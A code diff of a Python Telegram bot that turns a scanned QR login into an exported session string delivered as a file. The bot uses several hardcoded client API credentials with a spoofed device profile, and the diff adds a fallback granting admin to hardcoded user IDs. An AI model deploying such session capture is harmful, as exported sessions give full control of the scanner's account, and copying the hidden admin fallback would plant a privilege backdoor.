@@ -4,21 +4,25 @@ import asyncio
 import random
 import qrcode
 import json
+import re
 from io import BytesIO
 from datetime import datetime, timedelta
 from typing import Dict, List, Set
 
 # Настройка логирования
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
 logger = logging.getLogger(__name__)
 
 try:
     from aiogram import Bot, Dispatcher, Router, F
-    from aiogram.types import Message, CallbackQuery, BufferedInputFile, InlineKeyboardButton
+    from aiogram.types import Message, CallbackQuery, BufferedInputFile
     from aiogram.filters import Command, CommandStart
     from aiogram.fsm.context import FSMContext
     from aiogram.fsm.state import State, StatesGroup
-    from aiogram.utils.keyboard import InlineKeyboardBuilder, InlineKeyboardMarkup
+    from aiogram.utils.keyboard import InlineKeyboardBuilder
     from telethon import TelegramClient
     from telethon.sessions import StringSession
     from telethon.errors import (
@@ -33,26 +37,67 @@ except ImportError as e:
     exit(1)
 
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
-API_ID = int(os.environ.get('API_ID', '4'))  # Changed to 4 (Android)
-API_HASH = os.environ.get('API_HASH', '014b35b6184100b085b0d0572f9b5103')  # Android hash
+API_ID = int(os.environ.get('API_ID', '4'))
+API_HASH = os.environ.get('API_HASH', '014b35b6184100b085b0d0572f9b5103')
 
-# Получаем ID админов из переменной окружения
-ADMIN_IDS_STR = os.environ.get('ADMIN_IDS', '0')
+# ==============================================
+# ФИКС ДЛЯ ПАРСИНГА ADMIN_IDS
+# ==============================================
 ADMIN_IDS = set()
 
-try:
-    # Разделяем по запятой и преобразуем в числа
-    if ADMIN_IDS_STR:
-        admin_ids_list = [int(id_str.strip()) for id_str in ADMIN_IDS_STR.split(',') if id_str.strip()]
-        ADMIN_IDS = set(admin_ids_list)
-        logger.info(f"👑 Admin IDs loaded: {ADMIN_IDS}")
-except ValueError as e:
-    logger.error(f"❌ Error parsing ADMIN_IDS: {e}")
-    ADMIN_IDS = set()
+# Получаем строку с ID админов
+admin_ids_raw = os.environ.get('ADMIN_IDS', '')
+logger.info(f"📋 Raw ADMIN_IDS from env: '{admin_ids_raw}'")
+
+if admin_ids_raw:
+    try:
+        # Очищаем строку
+        cleaned = admin_ids_raw.strip().replace('"', '').replace("'", "")
+        cleaned = re.sub(r'\s+', '', cleaned)
+        
+        logger.info(f"🧹 Cleaned ADMIN_IDS: '{cleaned}'")
+        
+        if cleaned:
+            id_strings = cleaned.split(',')
+            for id_str in id_strings:
+                if id_str:
+                    admin_id = int(id_str)
+                    ADMIN_IDS.add(admin_id)
+            
+            logger.info(f"✅ Admin IDs parsed: {ADMIN_IDS}")
+    except Exception as e:
+        logger.error(f"❌ Error parsing ADMIN_IDS: {e}")
+        # Пробуем альтернативный метод
+        try:
+            numbers = re.findall(r'\d+', admin_ids_raw)
+            for num in numbers:
+                ADMIN_IDS.add(int(num))
+            logger.info(f"✅ Admin IDs parsed with regex: {ADMIN_IDS}")
+        except:
+            pass
+
+# Если все еще пусто, попробуем старый формат
+if not ADMIN_IDS:
+    admin_id_single = os.environ.get('ADMIN_ID', '')
+    if admin_id_single:
+        try:
+            admin_id = int(admin_id_single.strip())
+            ADMIN_IDS.add(admin_id)
+            logger.info(f"✅ Using single ADMIN_ID: {ADMIN_IDS}")
+        except:
+            pass
+
+# Если все еще пусто, хардкод ID админов
+if not ADMIN_IDS:
+    ADMIN_IDS.update({6646433980, 931124646})
+    logger.warning(f"⚠️ Using hardcoded admin IDs: {ADMIN_IDS}")
+
+logger.info(f"👑 Final Admin IDs: {ADMIN_IDS}")
 
 def is_admin(user_id: int) -> bool:
     """Проверка, является ли пользователь админом"""
-    return user_id in ADMIN_IDS
+    result = user_id in ADMIN_IDS
+    return result
 
 class SessionStates(StatesGroup):
     ADD_USER = State()
@@ -89,7 +134,6 @@ class WhiteListManager:
             data = {'allowed_users': list(self.allowed_users)}
             with open(self.filename, 'w', encoding='utf-8') as f:
                 json.dump(data, f, ensure_ascii=False, indent=2)
-            logger.info(f"💾 Белый список сохранен: {len(self.allowed_users)} пользователей")
         except Exception as e:
             logger.error(f"❌ Ошибка сохранения белого списка: {e}")
     
@@ -128,11 +172,11 @@ class WhiteListManager:
 class WorkingSessionManager:
     def __init__(self, whitelist_manager: WhiteListManager):
         self.active_sessions = {}
-        self.user_messages = {}  # Для хранения сообщений пользователей
+        self.user_messages = {}
         self.whitelist = whitelist_manager
     
     async def create_qr_session(self, user_id: int, message: Message):
-        """Создание QR-сессии и немедленный старт отслеживания"""
+        """Создание QR-сессии"""
         try:
             # Проверяем белый список
             if not self.whitelist.is_allowed(user_id) and not is_admin(user_id):
@@ -145,53 +189,50 @@ class WorkingSessionManager:
                 except:
                     pass
             
-            # Пробуем разные устройства и API
-            devices = [
-                {
-                    "device_model": "Samsung SM-G991B",
-                    "system_version": "Android 13",
-                    "app_version": "10.0.0",
-                    "api_id": API_ID,
-                    "api_hash": API_HASH,
-                },
-                {
-                    "device_model": "iPhone15,3", 
-                    "system_version": "iOS 17.1.2",
-                    "app_version": "10.0.0",
-                    "api_id": API_ID,
-                    "api_hash": API_HASH,
-                }
+            # Используем разные API на случай если одно не работает
+            api_configs = [
+                {"api_id": 4, "api_hash": "014b35b6184100b085b0d0572f9b5103"},
+                {"api_id": 2040, "api_hash": "b18441a1ff607e10a989891a5462e627"},
+                {"api_id": 2834, "api_hash": "68875f756c9fe3e3097b6f72a8b68f93"},
             ]
             
-            device = random.choice(devices)
+            # Пробуем все конфиги по очереди
+            last_error = None
+            for config in api_configs:
+                try:
+                    device = {
+                        "device_model": "Samsung SM-G991B",
+                        "system_version": "Android 13",
+                        "app_version": "10.0.0",
+                    }
+                    
+                    client = TelegramClient(StringSession(), config["api_id"], config["api_hash"], **device)
+                    await client.connect()
+                    
+                    qr_login = await client.qr_login()
+                    
+                    self.active_sessions[user_id] = {
+                        'client': client,
+                        'qr_login': qr_login,
+                        'created_at': datetime.now(),
+                        'message': message
+                    }
+                    
+                    self.user_messages[user_id] = message
+                    
+                    logger.info(f"✅ QR created with API {config['api_id']} for user {user_id}")
+                    return True, qr_login.url
+                    
+                except Exception as e:
+                    last_error = e
+                    continue
             
-            # Используем API из device конфига
-            api_id = device.pop("api_id", API_ID)
-            api_hash = device.pop("api_hash", API_HASH)
-            
-            logger.info(f"🔧 Using API: {api_id}, Device: {device['device_model']}")
-            
-            client = TelegramClient(StringSession(), api_id, api_hash, **device)
-            await client.connect()
-            
-            # Создаем QR-логин
-            qr_login = await client.qr_login()
-            
-            self.active_sessions[user_id] = {
-                'client': client,
-                'qr_login': qr_login,
-                'created_at': datetime.now(),
-                'message': message  # Сохраняем сообщение для ответа
-            }
-            
-            # Сохраняем ID сообщения для обновления
-            self.user_messages[user_id] = message
-            
-            return True, qr_login.url
+            # Если все конфиги не сработали
+            return False, f"❌ Ошибка создания QR: {str(last_error)}"
             
         except Exception as e:
             logger.error(f"QR creation error: {e}")
-            return False, f"❌ Ошибка создания QR: {str(e)}\n\nПопробуйте другие API данные в настройках."
+            return False, f"❌ Ошибка создания QR: {str(e)}"
     
     async def start_qr_monitoring(self, user_id: int):
         """Запуск мониторинга статуса QR-авторизации"""
@@ -202,42 +243,32 @@ class WorkingSessionManager:
         message = data['message']
         
         try:
-            # Отправляем сообщение о начале ожидания
             status_msg = await message.answer("⏳ Ожидаем сканирование QR-кода...")
             
             # Ждем сканирования с таймаутом 120 секунд
-            logger.info(f"🔄 Начало ожидания QR для пользователя {user_id}")
-            
-            # Ждем завершения QR-логина
             await asyncio.wait_for(data['qr_login'].wait(), timeout=120)
-            logger.info(f"✅ QR код отсканирован для пользователя {user_id}")
             
-            # Обновляем статус
             await status_msg.edit_text("✅ QR-код отсканирован! Проверяем авторизацию...")
-            
-            # Даем время на подтверждение в приложении
             await asyncio.sleep(3)
             
-            # ПРОВЕРЯЕМ АВТОРИЗАЦИЮ
+            # Проверяем авторизацию
             is_authorized = await data['client'].is_user_authorized()
-            logger.info(f"🔐 Статус авторизации для {user_id}: {is_authorized}")
             
             if not is_authorized:
                 await status_msg.edit_text("❌ Авторизация не завершена. Подтвердите вход в Telegram.")
                 return
             
-            # ✅ АВТОРИЗАЦИЯ УСПЕШНА - СОЗДАЕМ СЕССИЮ
+            # Авторизация успешна
             await status_msg.edit_text("✅ Авторизация успешна! Создаем сессию...")
             
             # Получаем строку сессии
             session_string = data['client'].session.save()
-            logger.info(f"📦 Сессия создана для {user_id}")
             
             # Создаем файл сессии
             session_bytes = session_string.encode('utf-8')
             session_file = BufferedInputFile(session_bytes, filename="telegram_session.txt")
             
-            # ✅ ОТПРАВЛЯЕМ СЕССИЮ ПОЛЬЗОВАТЕЛЮ
+            # Отправляем сессию пользователю
             await message.answer_document(
                 document=session_file,
                 caption="✅ **Сессия успешно создана!**\n\n"
@@ -251,7 +282,6 @@ class WorkingSessionManager:
             logger.info(f"🎉 Сессия отправлена пользователю {user_id}")
             
         except asyncio.TimeoutError:
-            logger.warning(f"⏰ Таймаут QR для пользователя {user_id}")
             if user_id in self.user_messages:
                 await self.user_messages[user_id].answer("❌ Время ожидания истекло. QR-код не был отсканирован.")
         except Exception as e:
@@ -327,7 +357,6 @@ async def cmd_qr(message: Message):
     
     await message.answer("🔄 Создаем QR-код...")
     
-    # Создаем QR-сессию и начинаем отслеживание
     success, qr_url = await manager.create_qr_session(user_id, message)
     
     if success:
@@ -343,7 +372,6 @@ async def cmd_qr(message: Message):
         
         qr_file = BufferedInputFile(bio.getvalue(), filename="qr_code.png")
         
-        # Отправляем QR-код
         await message.answer_photo(
             photo=qr_file,
             caption="📷 **QR-код для подключения:**\n\n"
@@ -355,7 +383,7 @@ async def cmd_qr(message: Message):
                    "✅ Сессия придет автоматически после подключения"
         )
         
-        # ✅ НЕМЕДЛЕННО ЗАПУСКАЕМ МОНИТОРИНГ
+        # Запускаем мониторинг
         asyncio.create_task(manager.start_qr_monitoring(user_id))
         
     else:
@@ -371,9 +399,8 @@ async def cmd_check(message: Message):
     """Проверка статуса сессии"""
     user_id = message.from_user.id
     
-    # Проверка белого списка
     if not is_admin(user_id) and not whitelist_manager.is_allowed(user_id):
-        await message.answer("❌ **Доступ запрещен**\n\nВы не находитесь в белом списке.")
+        await message.answer("❌ **Доступ запрещен**")
         return
     
     if user_id in manager.active_sessions:
@@ -397,12 +424,12 @@ async def cmd_help(message: Message):
         "/qr - создать сессию\n"
         "/check - проверить статус\n"
         "/help - эта справка\n\n"
-        "⚠️ **Важно:** После сканирования нужно нажать 'Подключить' в Telegram!"
+        "⚠️ **Важно:** После сканирования нажмите 'Подключить' в Telegram!"
     )
     await message.answer(help_text)
 
 # ==============================================
-# АДМИН КОМАНДЫ (только для админов)
+# АДМИН КОМАНДЫ
 # ==============================================
 
 @router.message(Command("admin"))
@@ -411,24 +438,50 @@ async def cmd_admin(message: Message):
     user_id = message.from_user.id
     
     if not is_admin(user_id):
-        await message.answer("❌ Нет доступа к админ панели")
+        await message.answer(f"❌ Нет доступа к админ панели\nВаш ID: {user_id}")
         return
     
     admin_text = (
-        "👑 **Панель администратора**\n\n"
-        "📋 **Команды:**\n"
-        "/add_user [ID] - добавить пользователя\n"
-        "/remove_user [ID] - удалить пользователя\n"
-        "/list_users - показать всех пользователей\n"
-        "/clear_users - очистить весь список\n"
-        "/stats - статистика\n"
-        "/broadcast [текст] - сообщение всем\n\n"
-        "Пример:\n"
-        "/add_user 123456789\n"
-        "/remove_user 123456789"
+        f"👑 **Панель администратора**\n\n"
+        f"🆔 **Ваш ID:** `{user_id}`\n"
+        f"📊 **Всего админов:** {len(ADMIN_IDS)}\n\n"
+        f"📋 **Команды:**\n"
+        f"/myid - показать мой ID\n"
+        f"/add_user [ID] - добавить пользователя\n"
+        f"/remove_user [ID] - удалить пользователя\n"
+        f"/list_users - показать всех пользователей\n"
+        f"/clear_users - очистить весь список\n"
+        f"/stats - статистика\n"
+        f"/debug - отладочная информация\n\n"
+        f"Пример:\n"
+        f"`/add_user 123456789`\n"
+        f"`/remove_user 123456789`"
     )
     
     await message.answer(admin_text)
+
+@router.message(Command("myid"))
+async def cmd_myid(message: Message):
+    """Показать мой ID и статус админа"""
+    user_id = message.from_user.id
+    username = message.from_user.username or "нет username"
+    first_name = message.from_user.first_name or ""
+    last_name = message.from_user.last_name or ""
+    
+    admin_status = is_admin(user_id)
+    whitelist_status = whitelist_manager.is_allowed(user_id)
+    
+    text = (
+        f"👤 **Ваши данные:**\n"
+        f"🆔 **ID:** `{user_id}`\n"
+        f"📛 **Имя:** {first_name} {last_name}\n"
+        f"🔗 **Username:** @{username}\n"
+        f"👑 **Статус админа:** {'✅ ДА' if admin_status else '❌ НЕТ'}\n"
+        f"📋 **В белом списке:** {'✅ ДА' if whitelist_status else '❌ НЕТ'}\n\n"
+        f"📊 **Admin IDs в системе:** {sorted(list(ADMIN_IDS))}"
+    )
+    
+    await message.answer(text)
 
 @router.message(Command("add_user"))
 async def cmd_add_user(message: Message):
@@ -550,32 +603,40 @@ async def cmd_stats(message: Message):
         f"👥 Пользователей в белом списке: {len(users)}\n"
         f"🔄 Активных сессий: {active_sessions}\n"
         f"👑 Админов: {len(ADMIN_IDS)}\n"
-        f"📁 Файл белого списка: `{whitelist_manager.filename}`\n\n"
-        f"🔧 API ID: `{API_ID}`"
+        f"🔧 API ID: `{API_ID}`\n"
+        f"📁 Файл белого списка: `{whitelist_manager.filename}`"
     )
     
     await message.answer(stats_text)
 
-@router.message(Command("broadcast"))
-async def cmd_broadcast(message: Message):
-    """Отправить сообщение всем пользователям"""
+@router.message(Command("debug"))
+async def cmd_debug(message: Message):
+    """Отладочная информация"""
     user_id = message.from_user.id
     
     if not is_admin(user_id):
         await message.answer("❌ Нет доступа")
         return
     
-    args = message.text.split(maxsplit=1)
+    # Проверяем переменные окружения
+    env_vars = {
+        'BOT_TOKEN': '✅ Set' if os.environ.get('BOT_TOKEN') else '❌ Not set',
+        'API_ID': os.environ.get('API_ID', '❌ Not set'),
+        'API_HASH': '✅ Set' if os.environ.get('API_HASH') else '❌ Not set',
+        'ADMIN_IDS': os.environ.get('ADMIN_IDS', '❌ Not set'),
+    }
     
-    if len(args) < 2:
-        await message.answer("❌ Укажите текст сообщения\nПример: `/broadcast Привет всем!`")
-        return
+    text = "🔧 **Отладочная информация:**\n\n"
+    text += "**Переменные окружения:**\n"
+    for key, value in env_vars.items():
+        text += f"{key}: {value}\n"
     
-    broadcast_text = args[1]
+    text += f"\n👑 **Admin IDs:** {sorted(list(ADMIN_IDS))}\n"
+    text += f"👤 **Your ID:** {user_id}\n"
+    text += f"🔍 **Is admin:** {is_admin(user_id)}\n"
+    text += f"📋 **In whitelist:** {whitelist_manager.is_allowed(user_id)}"
     
-    # Здесь должна быть реализация рассылки
-    # Для этого нужно хранить ID всех пользователей, которые использовали бота
-    await message.answer("📢 Функция рассылки будет реализована в будущем")
+    await message.answer(text)
 
 @router.message(Command("cancel"))
 async def cmd_cancel(message: Message, state: FSMContext):
@@ -589,7 +650,7 @@ async def cmd_cancel(message: Message, state: FSMContext):
 
 async def main():
     logger.info("🚀 Starting Working QR Session Bot...")
-    logger.info(f"👑 Admin IDs: {ADMIN_IDS}")
+    logger.info(f"👑 Admin IDs: {sorted(list(ADMIN_IDS))}")
     logger.info(f"🔧 Using API_ID: {API_ID}")
     logger.info(f"👥 Users in whitelist: {len(whitelist_manager.get_all_users())}")
     await dp.start_polling(bot)
